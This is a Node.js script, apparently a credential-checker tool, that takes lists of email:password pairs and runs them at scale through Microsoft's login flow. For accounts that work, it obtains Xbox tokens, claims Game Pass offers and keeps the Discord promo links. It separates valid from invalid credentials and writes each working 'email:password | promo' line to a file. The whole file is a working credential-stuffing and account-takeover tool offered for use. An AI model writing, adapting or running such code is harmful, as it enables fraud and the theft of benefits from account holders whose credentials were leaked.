// ============================================================
//  Promo Puller — pulls Discord promo codes from Xbox Game Pass
//  Strict 1:1 port of the upstream auth + offers pipeline.
//  Pipeline: dynamic PPFT → Microsoft login → Xbox auth →
//            XSTS (xboxlive.com) → profile.gamepass.com/v2/offers
//            → POST per available offer → filter "discord".
//  Direct connections only. Output: per-account promo URLs.
// ============================================================

const fs = require("fs");
const path = require("path");
const { logger } = require("./logger");

const log = logger.child("promopuller");

// ── Tunables ────────────────────────────────────────────────
const MAX_THREADS = 30;
const STEP_RETRIES = 5;
const OUTER_RETRIES = 5;
const REQ_TIMEOUT_MS = 15000;

const PROMOS_FILE = path.join(__dirname, "..", "..", "promos.txt");

// Mutex for promos.txt (serialise writes across workers)
const SAVE_LOCK = { busy: false, queue: [] };
async function withSaveLock(fn) {
  if (SAVE_LOCK.busy) {
    await new Promise((res) => SAVE_LOCK.queue.push(res));
  }
  SAVE_LOCK.busy = true;
  try {
    return await fn();
  } finally {
    SAVE_LOCK.busy = false;
    const next = SAVE_LOCK.queue.shift();
    if (next) next();
  }
}

// ── Auth landing URL (same as the AIO checker's sFTTag_url) ─
const SFT_URL =
  "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";

// Regexes mirror the upstream Python module
const RE_SFTTAG_VALUE = /value=\\"(.+?)\\"|value="(.+?)"|sFTTag:'(.+?)'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"/s;
const RE_URLPOST_VALUE = /"urlPost":"(.+?)"|urlPost:'(.+?)'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"/s;
const RE_IPT = /(?<="ipt" value=").+?(?=">)/;
const RE_PPRID = /(?<="pprid" value=").+?(?=">)/;
const RE_UAID = /(?<="uaid" value=").+?(?=">)/;
const RE_ACTION_FMHF = /(?<=id="fmHF" action=").+?(?=" )/;
const RE_RETURN_URL = /(?<="recoveryCancel":\{"returnUrl":").+?(?=",)/;

// ── Cookie jar ───────────────────────────────────────────────
class CookieJar {
  constructor() { this.cookies = new Map(); }
  ingestSetCookie(headers) {
    const sc = headers.getSetCookie ? headers.getSetCookie() : null;
    if (sc && sc.length) {
      for (const c of sc) this._parse(c);
      return;
    }
    const raw = headers.get("set-cookie");
    if (!raw) return;
    const parts = raw.split(/,(?=\s*[^;,]+=[^;,]+)/);
    for (const c of parts) this._parse(c);
  }
  _parse(str) {
    const head = String(str).split(";")[0].trim();
    const eq = head.indexOf("=");
    if (eq <= 0) return;
    this.cookies.set(head.slice(0, eq).trim(), head.slice(eq + 1).trim());
  }
  toString() {
    return [...this.cookies.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
  }
}

// ── Timeout-aware fetch ──────────────────────────────────────
async function timedFetch(url, opts = {}, ms = REQ_TIMEOUT_MS) {
  const ctrl = new AbortController();
  const userSignal = opts.signal;
  if (userSignal) {
    if (userSignal.aborted) ctrl.abort();
    else userSignal.addEventListener("abort", () => ctrl.abort(), { once: true });
  }
  const timer = setTimeout(() => { try { ctrl.abort(); } catch {} }, ms);
  try {
    return await fetch(url, { ...opts, signal: ctrl.signal });
  } finally {
    clearTimeout(timer);
  }
}

// ── Manual-redirect fetch with cookie jar ────────────────────
async function jarFetch(url, options, jar, signal) {
  let current = url;
  let opts = { ...options, redirect: "manual" };
  let hops = 0;
  while (hops++ < 12) {
    const headers = { ...(opts.headers || {}), Cookie: jar.toString() };
    const res = await timedFetch(current, { ...opts, headers, signal }, REQ_TIMEOUT_MS);
    jar.ingestSetCookie(res.headers);
    if (res.status >= 300 && res.status < 400) {
      const loc = res.headers.get("location");
      if (!loc) return res;
      let next = loc;
      if (loc.startsWith("/")) next = new URL(current).origin + loc;
      else if (!/^https?:/i.test(loc)) next = new URL(current).origin + "/" + loc;
      current = next;
      opts = { ...opts, method: "GET", body: undefined };
      continue;
    }
    const text = await res.text();
    return { status: res.status, url: current, text, headers: res.headers };
  }
  return { status: 0, url: current, text: "", headers: new Headers() };
}

function firstGroup(match) {
  if (!match) return null;
  for (let i = 1; i < match.length; i++) if (match[i]) return match[i];
  return null;
}

// ── Step 1: pull urlPost + sFTTag (PPFT) ─────────────────────
async function getUrlPostSFTTag(jar, signal) {
  for (let i = 0; i < STEP_RETRIES; i++) {
    if (signal?.aborted) return { error: "aborted" };
    try {
      const r = await jarFetch(SFT_URL, {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
        },
      }, jar, signal);
      const sFTTag = firstGroup(RE_SFTTAG_VALUE.exec(r.text));
      const urlPost = firstGroup(RE_URLPOST_VALUE.exec(r.text));
      if (sFTTag && urlPost) return { urlPost: urlPost.replace(/&amp;/g, "&"), sFTTag };
    } catch {}
  }
  return { error: "no_ppft" };
}

// ── Step 2: post credentials, harvest RPS access_token ───────
async function getXboxRps(jar, email, password, urlPost, sFTTag, signal) {
  for (let i = 0; i < STEP_RETRIES; i++) {
    if (signal?.aborted) return "ABORT";
    try {
      const body = new URLSearchParams({
        login: email,
        loginfmt: email,
        passwd: password,
        PPFT: sFTTag,
      }).toString();
      const r = await jarFetch(urlPost, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
        },
        body,
      }, jar, signal);

      // Token in fragment
      if (r.url.includes("#") && r.url !== SFT_URL) {
        try {
          const frag = new URL(r.url).hash.slice(1);
          const tok = new URLSearchParams(frag).get("access_token");
          if (tok) return tok;
        } catch {}
      }

      // Cancel-form path → resubmit hidden inputs
      if (r.text.includes("cancel?mkt=")) {
        const ipt = (r.text.match(RE_IPT) || [])[0];
        const pprid = (r.text.match(RE_PPRID) || [])[0];
        const uaid = (r.text.match(RE_UAID) || [])[0];
        const action = (r.text.match(RE_ACTION_FMHF) || [])[0];
        if (ipt && pprid && uaid && action) {
          const body2 = new URLSearchParams({ ipt, pprid, uaid }).toString();
          const ret = await jarFetch(action, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: body2,
          }, jar, signal);
          const back = (ret.text.match(RE_RETURN_URL) || [])[0];
          if (back) {
            const fin = await jarFetch(back, { method: "GET" }, jar, signal);
            try {
              const frag = new URL(fin.url).hash.slice(1);
              const tok = new URLSearchParams(frag).get("access_token");
              if (tok) return tok;
            } catch {}
          }
        }
      }

      const lower = r.text.toLowerCase();
      if (
        lower.includes("recover?mkt") ||
        lower.includes("account.live.com/identity/confirm?mkt") ||
        lower.includes("email/confirm?mkt") ||
        lower.includes("/abuse?mkt=")
      ) return "2FA";
      if (
        lower.includes("password is incorrect") ||
        lower.includes("account doesn't exist") ||
        lower.includes("sign in to your microsoft account") ||
        lower.includes("tried to sign in too many times") ||
        lower.includes("help us protect your account")
      ) return "BAD";
    } catch {}
  }
  return "ERROR";
}

// ── Step 3: Xbox user authenticate ───────────────────────────
async function xboxAuth(rps, signal) {
  for (let i = 0; i < STEP_RETRIES; i++) {
    if (signal?.aborted) return null;
    try {
      const r = await timedFetch("https://user.auth.xboxlive.com/user/authenticate", {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify({
          Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: rps },
          RelyingParty: "http://auth.xboxlive.com",
          TokenType: "JWT",
        }),
        signal,
      });
      if (r.status === 429) continue;
      const j = await r.json().catch(() => ({}));
      const xboxToken = j.Token;
      const uhs = j?.DisplayClaims?.xui?.[0]?.uhs;
      if (xboxToken && uhs) return { xboxToken, uhs };
      return null;
    } catch {}
  }
  return null;
}

// ── Step 4: XSTS authorize against xboxlive.com (Game Pass) ──
async function xstsGamePass(xboxToken, uhs, signal) {
  for (let i = 0; i < STEP_RETRIES; i++) {
    if (signal?.aborted) return null;
    try {
      const r = await timedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify({
          Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
          RelyingParty: "http://xboxlive.com",
          TokenType: "JWT",
        }),
        signal,
      });
      if (r.status === 429) { await sleep(1000); continue; }
      if (r.status === 401) return null;
      if (r.status !== 200) return null;
      const j = await r.json().catch(() => ({}));
      if (j.Token) return `XBL3.0 x=${uhs};${j.Token}`;
      return null;
    } catch {}
  }
  return null;
}

// ── Step 5: list offers and pick Discord promos ──────────────
async function fetchDiscordPromos(authHeader, signal) {
  let offers = null;
  for (let i = 0; i < STEP_RETRIES; i++) {
    if (signal?.aborted) return [];
    try {
      const r = await timedFetch("https://profile.gamepass.com/v2/offers", {
        method: "GET",
        headers: { authorization: authHeader },
        signal,
      });
      if (r.status === 429) { await sleep(1000); continue; }
      if (r.status !== 200) return [];
      const j = await r.json().catch(() => ({}));
      offers = j.offers || [];
      break;
    } catch {}
  }
  if (!offers) return [];

  const promos = [];
  for (const offer of offers) {
    if (signal?.aborted) break;
    let promo = null;
    const status = offer.offerStatus;
    if (status === "available") {
      try {
        const r = await timedFetch(
          `https://profile.gamepass.com/v2/offers/${offer.offerId}`,
          { method: "POST", headers: { authorization: authHeader }, signal },
        );
        if (r.status === 200) {
          const j = await r.json().catch(() => ({}));
          promo = j.resource;
        }
      } catch {}
    } else if (status === "claimed") {
      promo = offer.resource;
    }

    if (promo && String(promo).toLowerCase().includes("discord")) {
      promos.push(String(promo));
      // upstream Python breaks after first discord match
      break;
    }
  }
  return promos;
}

// ── Per-account flow ─────────────────────────────────────────
async function checkAccount(email, password, signal) {
  let outer = 0;
  while (outer++ < OUTER_RETRIES) {
    if (signal?.aborted) return { error: "aborted", links: [] };
    try {
      const jar = new CookieJar();

      const sft = await getUrlPostSFTTag(jar, signal);
      if (sft.error) return { error: sft.error, links: [] };

      const rps = await getXboxRps(jar, email, password, sft.urlPost, sft.sFTTag, signal);
      if (rps === "2FA") return { error: "2fa", links: [] };
      if (rps === "BAD") return { error: "bad_credentials", links: [] };
      if (rps === "ABORT") return { error: "aborted", links: [] };
      if (rps === "ERROR" || !rps) continue;

      const xa = await xboxAuth(rps, signal);
      if (!xa) return { error: "xbox_auth_failed", links: [] };

      const auth = await xstsGamePass(xa.xboxToken, xa.uhs, signal);
      if (!auth) return { error: "xsts_failed", links: [] };

      const promos = await fetchDiscordPromos(auth, signal);
      return { error: null, links: promos };
    } catch (e) {
      const msg = String(e?.message || e || "");
      if (!/timeout|abort/i.test(msg)) {
        log.warn(`error ${email}: ${msg}`);
      }
    }
  }
  return { error: "retries_exhausted", links: [] };
}

// ── Pool runner ──────────────────────────────────────────────
async function runPool(items, worker, concurrency, signal) {
  let i = 0;
  const results = new Array(items.length);
  const workers = [];
  const n = Math.min(concurrency, items.length);
  for (let w = 0; w < n; w++) {
    workers.push((async () => {
      while (true) {
        if (signal?.aborted) return;
        const idx = i++;
        if (idx >= items.length) return;
        try {
          results[idx] = await worker(items[idx], idx);
        } catch (e) {
          results[idx] = { error: e.message || String(e), links: [] };
        }
      }
    })());
  }
  await Promise.all(workers);
  return results;
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

// ── Public API (unchanged signature) ─────────────────────────
async function pullPromos(accounts, onProgress, signal) {
  try { fs.writeFileSync(PROMOS_FILE, ""); } catch {}

  const counters = { checked: 0, promosFound: 0 };
  const total = accounts.length;
  const fetchResults = [];
  const allLinks = [];

  log.info(`starting promo puller: ${total} accounts`);

  await runPool(accounts, async (acc) => {
    const email = acc.email || acc[0];
    const password = acc.password || acc[1];
    const res = await checkAccount(email, password, signal);

    counters.checked += 1;
    const accountLinks = res.links || [];

    if (accountLinks.length > 0) {
      await withSaveLock(async () => {
        counters.promosFound += accountLinks.length;
        try {
          for (const promo of accountLinks) {
            fs.appendFileSync(PROMOS_FILE, `${email}:${password} | ${promo}\n`);
          }
        } catch (e) {
          log.warn(`promos.txt write failed: ${e.message}`);
        }
      });
    }

    fetchResults.push({
      email,
      password,
      links: accountLinks,
      error: res.error || null,
    });

    for (const link of accountLinks) {
      allLinks.push({ link, sourceEmail: email });
    }

    if (typeof onProgress === "function") {
      try {
        onProgress("fetch", {
          done: counters.checked,
          total,
          email,
          links: accountLinks.length,
          error: res.error || null,
        });
      } catch {}
    }
  }, MAX_THREADS, signal);

  log.info(`done. checked=${counters.checked}/${total} promos=${counters.promosFound}`);
  return { fetchResults, allLinks };
}

module.exports = { pullPromos };
